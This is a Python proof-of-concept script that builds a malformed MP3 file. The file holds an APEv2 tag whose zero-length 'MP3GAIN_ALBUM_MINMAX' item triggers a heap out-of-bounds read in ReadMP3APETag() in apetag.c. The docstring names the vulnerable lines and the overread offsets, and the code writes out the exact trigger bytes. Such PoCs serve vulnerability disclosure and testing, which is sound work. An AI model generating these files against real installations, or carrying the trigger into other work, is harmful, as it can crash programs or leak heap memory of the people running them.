#!/usr/bin/env python3
"""
PoC generator for VULN 003: Heap OOB Read in MP3GAIN_ALBUM_MINMAX APE Field Parsing
Vulnerability: ReadMP3APETag() in apetag.c lines 254-264
Trigger: APE item with name="MP3GAIN_ALBUM_MINMAX" and vsize=0 causes:
  - line 258: memcpy(tmpString, vp, 3) reads 3 bytes from 1-byte heap buffer (OOB +2)
  - line 262: memcpy(tmpString, vp, 3) where vp=value+4, reads 3 bytes starting 4
              bytes past 1-byte buffer (OOB +7)
"""

import struct
import os

OUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_003.mp3")

# --- Minimal fake MP3 frame ---
# MPEG1 Layer3 128kbps 44100Hz stereo, no CRC
# Header bytes: FF FB 90 00
# Frame size = 144 * 128000 / 44100 = 417 bytes
MP3_FRAME_HEADER = bytes([0xFF, 0xFB, 0x90, 0x00])
FRAME_SIZE = 417
mp3_frame = MP3_FRAME_HEADER + bytes(FRAME_SIZE - 4)

# --- Malicious APE item ---
# item_value_size = 0  -> malloc(1) for value buffer
# item_flags = 0       -> UTF-8 text
# item_key = "MP3GAIN_ALBUM_MINMAX\0"  (21 bytes with null terminator)
# item_value = ""      (0 bytes)
item_value_size = 0
item_flags = 0
item_key = b"MP3GAIN_ALBUM_MINMAX\x00"   # 21 bytes
item_value = b""

item = struct.pack("<II", item_value_size, item_flags) + item_key + item_value
# item length = 4 + 4 + 21 + 0 = 29 bytes

# --- APEv2 footer ---
# Size field = total items bytes + 32 (footer size), NOT including any header
items_total = len(item)   # 29
tag_size = items_total + 32   # 61

item_count = 1

# Flags for footer-only tag (no header):
# bit 31 = 0: tag does NOT have a header
# bit 30 = 0: tag has a footer (footer is present)
# bit 29 = 0: this block IS the footer (not the header)
footer_flags = 0x00000000

footer = (
    b"APETAGEX"
    + struct.pack("<I", 2000)           # version 2000 = APEv2
    + struct.pack("<I", tag_size)       # Length: items + footer (32)
    + struct.pack("<I", item_count)     # TagCount
    + struct.pack("<I", footer_flags)   # Flags
    + b"\x00" * 8                       # Reserved
)
assert len(footer) == 32

# --- Compose file ---
# Layout: [fake MP3 frame] [APE items] [APE footer]
data = mp3_frame + item + footer

with open(OUT_FILE, "wb") as f:
    f.write(data)

print(f"Written {len(data)} bytes to {OUT_FILE}")
print(f"  MP3 frame:   {FRAME_SIZE} bytes")
print(f"  APE item:    {len(item)} bytes  (name=MP3GAIN_ALBUM_MINMAX, vsize=0)")
print(f"  APE footer:  {len(footer)} bytes  (tag_size={tag_size})")
